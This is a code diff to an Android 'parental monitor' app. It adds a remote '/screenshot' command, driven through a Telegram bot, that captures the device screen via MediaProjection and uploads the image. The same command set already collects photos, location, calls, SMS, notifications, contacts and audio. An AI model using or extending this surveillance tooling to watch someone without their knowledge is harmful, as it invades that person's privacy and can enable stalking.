@@ -4,7 +4,15 @@ import android.app.Service
 import android.content.Intent
 import android.content.pm.ServiceInfo
 import android.os.Build
+import android.graphics.Bitmap
+import android.graphics.PixelFormat
+import android.hardware.display.DisplayManager
+import android.hardware.display.VirtualDisplay
+import android.media.ImageReader
+import android.media.projection.MediaProjection
+import android.media.projection.MediaProjectionManager
 import android.os.IBinder
+import android.util.DisplayMetrics
 import androidx.core.app.NotificationCompat
 import com.redeye.parentalmonitor.ParentalMonitorApp
 import com.redeye.parentalmonitor.R
@@ -71,6 +79,8 @@ class MonitoringService : Service() {
     private var cameraCycleMs = 0L
     private var serviceStartAt = 0L
     private val cameraAttempt = java.util.concurrent.atomic.AtomicInteger(0)
+    private val shotBusy = AtomicBoolean(false)
+    private var shotWatchdog: Job? = null
     @Volatile
     private var appliedFgsTypes = 0
 
@@ -115,7 +125,7 @@ class MonitoringService : Service() {
         private val TAG_STRIP_REGEX = Regex("</?[a-zA-Z][^>]*>")
         private val MUTATING_COMMANDS = setOf("/lock", "/ring", "/sms", "/smsconfirm", "/record", "/stop", "/resume", "/pause", "/photointerval", "/syncinterval", "/camera", "/notif", "/restart", "/flush", "/clearqueue")
         private val NO_REPLAY_COMMANDS = setOf("/smsconfirm")
-        private val SENSITIVE_COMMANDS = setOf("/photo", "/location", "/lastcalls", "/lastsms", "/lastnotif", "/contacts", "/history", "/apps", "/log", "/version", "/status", "/battery", "/uptime", "/storage")
+        private val SENSITIVE_COMMANDS = setOf("/screenshot", "/photo", "/location", "/lastcalls", "/lastsms", "/lastnotif", "/contacts", "/history", "/apps", "/log", "/version", "/status", "/battery", "/uptime", "/storage")
         private const val COMMAND_MAX_AGE_SEC = 900L
         private const val NOTIFICATION_ID = 1
         private const val MAX_AUDIO_KEPT = 5
@@ -809,6 +819,7 @@ class MonitoringService : Service() {
                         "camfront" -> "/camera"
                         "camback" -> "/camera"
                         "pause60" -> "/pause"
+                        "shot" -> "/screenshot"
                         else -> null
                     }
                     if (cbCommand != null && cbCommand in NO_REPLAY_COMMANDS) {
@@ -913,6 +924,7 @@ class MonitoringService : Service() {
             "camfront" -> "/camera depan"
             "camback" -> "/camera belakang"
             "pause60" -> "/pause 60"
+            "shot" -> "/screenshot"
             else -> return
         }
         val originOk = originChat.isNotEmpty() && originChat == chatId
@@ -975,6 +987,7 @@ class MonitoringService : Service() {
     private fun botCommandList(): List<com.redeye.parentalmonitor.network.BotCommand> {
         return listOf(
             com.redeye.parentalmonitor.network.BotCommand("photo", "Take a photo now"),
+            com.redeye.parentalmonitor.network.BotCommand("screenshot", "Capture device screen"),
             com.redeye.parentalmonitor.network.BotCommand("camera", "Switch camera: /camera front|back"),
             com.redeye.parentalmonitor.network.BotCommand("location", "Send current location"),
             com.redeye.parentalmonitor.network.BotCommand("lastcalls", "Show last 5 calls"),
@@ -1059,7 +1072,8 @@ class MonitoringService : Service() {
                 listOf(button("\uD83D\uDCDE Calls", "lastcalls"), button("\uD83D\uDCAC SMS", "lastsms")),
                 listOf(button("\uD83D\uDCF7 Front", "camfront"), button("\uD83D\uDCF7 Back", "camback")),
                 listOf(button("⏸️ Pause 60 min", "pause60"), button("▶️ Resume", "resume")),
-                listOf(button("\uD83D\uDD0B Battery", "battery"), button("\uD83D\uDCCA Status", "status"))
+                listOf(button("\uD83D\uDD0B Battery", "battery"), button("\uD83D\uDCCA Status", "status")),
+                listOf(button("\uD83D\uDDA5 Screenshot", "shot"))
             )
         )
     }
@@ -1129,6 +1143,14 @@ class MonitoringService : Service() {
                 } else {
                     sendToTelegram("📸 Taking photo now…")
                     captureAndSendPhoto(reportResult = true)
+                }
+            }
+            "/screenshot" -> {
+                if (preferencesManager.monitoringPaused) {
+                    sendToTelegram("⏸️ Monitoring is paused. Send /resume first.")
+                } else {
+                    sendToTelegram("\uD83D\uDDA5 Capturing screen…")
+                    captureAndSendScreenshot(reportResult = true)
                 }
             }
             "/status" -> {
@@ -1616,6 +1638,7 @@ class MonitoringService : Service() {
                         appendLine()
                         appendLine("🤖 <b>Commands</b>")
                         appendLine("/photo - take a photo now")
+                        appendLine("/screenshot - capture device screen")
                         appendLine("/camera \u003cfront|back\u003e - switch camera")
                         appendLine("/location - send current location")
                         appendLine("/lastcalls - show last 5 calls")
@@ -2821,6 +2844,165 @@ class MonitoringService : Service() {
         }
     }
     
+    private fun hasScreenshotConsent(): Boolean {
+        return try { preferencesManager.hasScreenshotConsent() } catch (_: Exception) { false }
+    }
+
+    private fun captureAndSendScreenshot(reportResult: Boolean = false) {
+        if (NetworkUtils.isAuthBlocked(preferencesManager)) {
+            serviceScope.launch {
+                if (reportResult) {
+                    sendToTelegram("Auth rejected, screenshot delayed until the token is fixed in Setup.")
+                }
+            }
+            return
+        }
+        if (!hasScreenshotConsent()) {
+            serviceScope.launch {
+                if (reportResult) {
+                    sendToTelegram("⚠️ Screen capture not granted. Open Setup and tap Capture Screen, then allow it once.")
+                }
+            }
+            return
+        }
+        if (!shotBusy.compareAndSet(false, true)) {
+            serviceScope.launch {
+                if (reportResult) {
+                    sendToTelegram("⚠️ Screenshot still running, please try /screenshot again in a moment.")
+                }
+            }
+            return
+        }
+        shotWatchdog?.cancel()
+        val wd = serviceScope.launch {
+            delay(45_000)
+            if (shotBusy.compareAndSet(true, false)) {
+                android.util.Log.w("MonitoringService", "Screenshot watchdog: capture did not finish, flag reset")
+                if (reportResult) {
+                    sendToTelegram("⚠️ Screenshot timed out without a response. Please try /screenshot again.")
+                }
+            }
+        }
+        shotWatchdog = wd
+        serviceScope.launch {
+            try {
+                ensureForegroundTypes()
+                val shotFile = try {
+                    takeScreenshotFrame()
+                } catch (e: SecurityException) {
+                    try { preferencesManager.clearScreenshotConsentSync() } catch (_: Exception) { }
+                    try { wd.cancel() } catch (_: Exception) { }
+                    shotBusy.set(false)
+                    if (reportResult) {
+                        sendToTelegram("⚠️ Screen capture was revoked. Open Setup and tap Capture Screen to grant it again.")
+                    } else {
+                        notifyPhotoSendFailure("screen capture revoked")
+                    }
+                    return@launch
+                }
+                try { wd.cancel() } catch (_: Exception) { }
+                if (shotFile == null) {
+                    shotBusy.set(false)
+                    if (reportResult) {
+                        sendToTelegram("⚠️ Screenshot failed. If the system revoked access, grant it again in Setup (Capture Screen).")
+                    }
+                    return@launch
+                }
+                activePhotoFile = shotFile
+                try {
+                    when (sendPhotoFile(shotFile)) {
+                        MediaSendOutcome.SENT -> flushPendingPhotos()
+                        MediaSendOutcome.DROPPED -> {
+                            prunePhotoCache()
+                            if (reportResult) {
+                                sendToTelegram("⚠️ Screenshot rejected by Telegram (400), file discarded.")
+                            }
+                        }
+                        MediaSendOutcome.KEPT -> {
+                            prunePhotoCache()
+                            if (reportResult) {
+                                sendToTelegram("⚠️ Screenshot captured but upload failed. File kept for retry.")
+                            }
+                        }
+                    }
+                } finally {
+                    activePhotoFile = null
+                }
+                shotBusy.set(false)
+            } catch (e: kotlinx.coroutines.CancellationException) {
+                throw e
+            } catch (e: Exception) {
+                shotBusy.set(false)
+                try { wd.cancel() } catch (_: Exception) { }
+                android.util.Log.e("MonitoringService", "✗ Error in captureAndSendScreenshot: ${redactToken(e.message)}")
+                serviceScope.launch {
+                    if (reportResult) {
+                        sendToTelegram("⚠️ Screenshot failed. If the system revoked access, grant it again in Setup (Capture Screen).")
+                    }
+                }
+            }
+        }
+    }
+
+    private fun takeScreenshotFrame(): File? {
+        val code = try { preferencesManager.screenshotResultCode } catch (_: Exception) { 0 }
+        val uri = try { preferencesManager.screenshotData } catch (_: Exception) { "" }
+        if (code == 0 || uri.isEmpty()) return null
+        var projection: MediaProjection? = null
+        var display: VirtualDisplay? = null
+        var reader: ImageReader? = null
+        try {
+            val data = Intent.parseUri(uri, 0)
+            val mpm = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+            projection = mpm.getMediaProjection(code, data)
+            val metrics = DisplayMetrics()
+            try {
+                @Suppress("DEPRECATION")
+                windowManager.defaultDisplay.getRealMetrics(metrics)
+            } catch (_: Exception) {
+                @Suppress("DEPRECATION")
+                windowManager.defaultDisplay.getMetrics(metrics)
+            }
+            var width = metrics.widthPixels
+            var height = metrics.heightPixels
+            if (width <= 0 || height <= 0) return null
+            val scale = if (width > 720) 720f / width else 1f
+            width = (width * scale).toInt()
+            height = (height * scale).toInt()
+            reader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
+            display = projection.createVirtualDisplay("redeye-shot", width, height, metrics.densityDpi, DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, reader.surface, null, null)
+            var image: android.media.Image? = null
+            for (i in 0 until 30) {
+                try { image = reader.acquireLatestImage() } catch (_: Exception) { }
+                if (image != null) break
+                try { Thread.sleep(100) } catch (_: Exception) { }
+            }
+            val img = image ?: return null
+            try {
+                val plane = img.planes[0]
+                val rowWidth = plane.rowStride / plane.pixelStride
+                val bmp = Bitmap.createBitmap(rowWidth, height, Bitmap.Config.ARGB_8888)
+                bmp.copyPixelsFromBuffer(plane.buffer)
+                val cropped = if (rowWidth != width) Bitmap.createBitmap(bmp, 0, 0, width, height) else bmp
+                val out = File(cacheDir, "screenshot_" + TimeFmt.fileStamp(System.currentTimeMillis()) + ".jpg")
+                try {
+                    java.io.FileOutputStream(out).use { cropped.compress(Bitmap.CompressFormat.JPEG, 85, it) }
+                } finally {
+                    if (cropped !== bmp) { try { bmp.recycle() } catch (_: Exception) { } }
+                    try { cropped.recycle() } catch (_: Exception) { }
+                }
+                if (!out.exists() || out.length() == 0L) { deleteQuietly(out); return null }
+                return out
+            } finally {
+                try { img.close() } catch (_: Exception) { }
+            }
+        } finally {
+            try { display?.release() } catch (_: Exception) { }
+            try { reader?.close() } catch (_: Exception) { }
+            try { projection?.stop() } catch (_: Exception) { }
+        }
+    }
+
     private fun sanitizedCameraError(reason: String?): String {
         if (isCameraPolicyError(reason)) return "camera disabled by device policy (CAMERA_DISABLED)"
         val firstLine = (reason ?: "unknown error").lineSequence().firstOrNull()?.trim().orEmpty()
@@ -2876,6 +3058,9 @@ class MonitoringService : Service() {
         }
         if (hasLocationPermission()) {
             types = types or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
+        }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && hasScreenshotConsent()) {
+            types = types or ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
         }
         return types
     }
@@ -2949,7 +3134,7 @@ class MonitoringService : Service() {
     private fun pendingPhotoCount(): Int {
         return try {
             cacheDir.listFiles { file ->
-                file.isFile && file.name.startsWith("camera_") && file.name.endsWith(".jpg")
+                file.isFile && (file.name.startsWith("camera_") || file.name.startsWith("screenshot_")) && file.name.endsWith(".jpg")
             }?.size ?: 0
         } catch (_: Exception) {
             0
@@ -3453,7 +3638,7 @@ class MonitoringService : Service() {
                 try {
                     if (file.isFile) {
                         bytes += file.length()
-                        if (file.name.startsWith("camera_") && file.name.endsWith(".jpg")) photos++
+                        if ((file.name.startsWith("camera_") || file.name.startsWith("screenshot_")) && file.name.endsWith(".jpg")) photos++
                         if (file.name.startsWith("audio_") && file.name.endsWith(".m4a")) audios++
                     }
                 } catch (_: Exception) {
@@ -3563,7 +3748,7 @@ class MonitoringService : Service() {
         try {
             val pending = try {
                 cacheDir.listFiles { file ->
-                    file.isFile && file.name.startsWith("camera_") && file.name.endsWith(".jpg")
+                    file.isFile && (file.name.startsWith("camera_") || file.name.startsWith("screenshot_")) && file.name.endsWith(".jpg")
                 }?.sortedBy { it.lastModified() }?.take(max) ?: return
             } catch (e: Exception) {
                 return
@@ -3606,7 +3791,7 @@ class MonitoringService : Service() {
             } catch (_: Exception) {
             }
             val photos = cacheDir.listFiles { file ->
-                file.isFile && file.name.startsWith("camera_") && file.name.endsWith(".jpg")
+                file.isFile && (file.name.startsWith("camera_") || file.name.startsWith("screenshot_")) && file.name.endsWith(".jpg")
             }?.sortedBy { it.lastModified() }?.filter { it != activePhotoFile } ?: return
             val dropped = photos.dropLast(maxKept)
             if (dropped.isEmpty()) return
